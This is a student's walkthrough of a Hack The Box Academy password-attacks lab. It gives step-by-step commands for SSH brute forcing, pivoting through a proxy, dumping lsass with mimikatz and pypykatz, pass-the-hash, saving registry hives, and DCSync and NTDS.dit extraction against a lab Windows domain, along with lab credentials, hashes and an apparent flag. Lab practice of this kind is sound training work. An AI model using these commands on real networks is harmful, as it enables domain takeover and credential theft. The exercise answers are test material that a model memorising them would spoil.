# Skills Assessment - Password Attacks
Refers to Hack The Box Academy <a href="https://academy.hackthebox.com/course/preview/password-attacks">Password Attacks</a> module, Skills Assessment exercise.

The exercise provided the name Betty Jayde and her probable password 'Texas123!@#', along with the company name and the names and IPs of the machines that were in scope. It also stated that JUMP01, FILE01, and DC01 were on an internal network and were only accessible via DMZ01, the only machine accessible via the internet.

First, I created a username wordlist using the tool 'Anarchy'.

```bash
./username-anarchy -i names.txt > usernames.txt
```

Then, to identify the correct username, I used hydra.

```bash
hydra -L usernames.txt -p 'Texas123!@#' 10.129.*.* ssh
```

This way, I discovered that the username was 'jbetty'.

I accessed the DMZ01 machine already doing port forwarding for port 9050 via SSH.

```bash
ssh -D 9050 jbetty@10.129.*.*
```

I started looking for credentials on this machine; jbetty did not have sudo. I ran LinEnum but found nothing for privilege escalation. However, when reading jbetty’s .bash\_history file, I found credentials.
On this machine, I found credentials for the user hwilliam, which allowed me RDP access to the JUMP01 machine.

```
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

I then gained access to the JUMP01 machine with the user hwilliam’s credentials. This user did not have Administrator privileges on JUMP01, but had access privileges to FILE01 in the HR folder.

Looking for credentials, I opened the file system and saw that recently there were some files in \file01 with passwords in their names. I then realized that FILE01 was a shared directory.
I found .bat files in \file01\HR. I brought those files to my machine and dumped the hashes:

```bash
python3 /usr/share/john/pwsafe2john.py Employee-Passwords_OLD_013.ibak > psafe.hash
```

Shortly after, I cracked the hash with john.

```cmd
irule123         (Employee-Passwords_OLD_011.ibak)
```

I got access to the password file 'pwsafe Employee-Passwords\_OLD\_011.ibak' with the password 'irule123'.

```
Davcid Brittni - bdavid : caramel-cigars-reply1
Tom Sandy (stom) : fails-nibble-disturb4
William Hallam - hwilliam : warned-wobble-occur8
```

Only the credential for 'bdavid' was correct. So, I gained access with the user bdavid.

```cmd
runas /user:nexura\bdavid cmd
```

bdavid had access to Administrators.

```
bdavid user has a BUILTIN\Administrators
```

I dumped the lsass process via 'Task Manager'

```
C:\Users\bdavid\AppData\Local\Temp\lsass.DMP
```

Extracted the credentials.

```bash
pypykatz lsa minidump lsass.DMP
```

I found the password for the user Administrator, but it was the same one I found in another file and it did not work, probably being the flag for another exercise.

```
username NEXURA\Administrator
domain NEXURA\Administrator
HTB_@cad3my_lab_W1n19_r00t!@0
```

However, I also found the hash for user 'stom' which worked for Pass the Hash.

```
<SNIP>
Username: stom
Domain: NEXURA
LM: NA
NT: 21ea958524cfd9a7791737f8d2f764fa
SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
<SNIP>
```

I tried access via RDP, but needed to enable 'Restricted Admin Mode' first. Then I accessed via evil-winrm and enabled it.

```bash
proxychains evil-winrm -i 172.16.119.7 -u stom -H 21ea958524cfd9a7791737f8d2f764fa
```

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Accessed via RDP

```bash
proxychains xfreerdp /v:172.16.119.7 /d:nexura /u:stom /pth:21ea958524cfd9a7791737f8d2f764fa /drive:linux,/home/htb-ac-1501733/ /dynamic-resolution
```

The user stom also had BUILTIN\Administrators privileges, besides access to IT and management folders on FILE01.
In FILE01 IT, there were pcap files. The one that caught the most attention was 2025-04029\_live.pcap, still, I found nothing useful. Nothing useful was found in management either.

I dumped lsass with user stom and obtained his password in plain text.

```
<SNIP>
== Kerberos ==
        Username: stom
        Domain: NEXURA.HTB
        Password: calves-warp-learning1
<SNIP>
```

I used mimikatz to search for Administrator credentials but had no success with either NTLM hashes or Kerberos tickets.

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
sekurlsa::logonpasswords
sekurlsa::tickets /export
```

I tried to access other machines via RDP.

```cmd
mstsc /v:DC01.nexura.htb
mstsc /v:FILE01.nexura.htb
```

I performed all procedures but did not find the Administrator’s hash or password.

Back on the JUMP01 machine, I exported the Registry hives:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

I found several hashes, including for the NEXURA domain via HKLM\SECURITY, but they were outdated.

```
<SNIP>
NEXURA.HTB/Administrator:$DCC2$10240#Administrator#10c34f0413c282fbc37de4ee4bb75360: (2025-06-02 10:32:53+00:00)
<SNIP>
```

I tried to crack this hash with hashcat using the rockyou wordlist but failed.

```bash
hashcat -m 2100 '$DCC2$10240#Administrator#10c34f0413c282fbc37de4ee4bb75360' workspace/wordlists/rockyou.txt
```

I then realized that the Administrator had no active session and did not do interactive logon on any of these machines.

So I moved on to DCSync. I used secretsdump to connect to the Domain Controller (172.16.119.11) and request hashes of accounts directly from the NTDS.dit database, since netexec was not working well with proxychains.

```bash
proxychains4 secretsdump.py stom:'calves-warp-learning1'@172.16.119.11 -just-dc
```

For didactic purposes, I returned to the DC01 machine via RDP and copied the NTDS.dit and SYSTEM hive.

```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS.dit
```

On my machine, I extracted the hashes.

```bash
secretsdump.py -ntds NTDS.dit -system system.save LOCAL
```

```
<SNIP>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
<SNIP>
```

<a href="https://academy.hackthebox.com/achievement/1501733/147">Certificate</a>


